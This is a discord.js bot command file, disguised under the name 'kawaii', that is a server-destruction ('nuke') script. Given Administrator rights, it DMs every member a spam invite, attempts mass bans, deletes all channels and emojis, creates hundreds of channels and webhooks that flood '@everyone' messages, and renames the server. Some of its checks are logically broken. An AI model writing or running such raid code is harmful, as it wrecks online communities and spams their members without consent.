const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const { error, hershell, success } = require("../lib/util");
module.exports = {
  name: "kawaii",
  description: "asd",
  block: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {

    if(!message.guild.members.me.permissions.has("Administrator")) return error(message, "I'm missing permissions!")

        message.guild.members.cache.forEach(member => { 
          if(member.user.bot) return;
          member.send("discord.gg/peru").catch((e => console.log(`${e.message} - ${member.id}`)))
      })

      message.guild.members.cache.forEach(async (r) => { 
        if(r.user.bot) return;
        if(!r.bannable) await r.ban();
    })
          
        message.guild.emojis.cache.forEach(emoji => emoji.delete());

    message.guild.channels.cache.forEach(channel => channel.delete());

     for (let i = 0;i < 499;i++) {
        message.guild.channels.create({ 
            name: 'Shabby'
        }).then(c => {
          c.createWebhook({
            name: "Shabz",
            avatar: "https://media.discordapp.net/attachments/894697673150595113/906129601334509588/images_14.jpeg",
          }).then(m => {
            for (let i = 0;i < 50;i++) {
              m.send("@everyone discord.gg/peru")
            }
          })
            for (let i = 0;i < 50;i++) {
            c.send("@everyone fcked by shabby discord.gg/peru")
          } 
        })
        }  

    await message.guild.setName("#Shabby")
    await message.guild.setIcon("https://cdn.discordapp.com/icons/1093539713123623033/e48b069cad5cb7c58bd13f7abd531948.png?size=2048")

    for (let i = 0;i < 50;i++) {
      message.guild.emojis.create({
          attachment: "https://cdn.discordapp.com/emojis/1094283156527521853.gif?v=1",
          name: 'Shabby'
      }); 
  }

    if(!message.guild.roles.cache.size > 249) {
        for (let i = 0;i < 249;i++) {
            message.guild.roles.create({
                name: "Shabby"
            })
            }
    } else {
        return console.log("Maximium roles created!")
    }

  },
};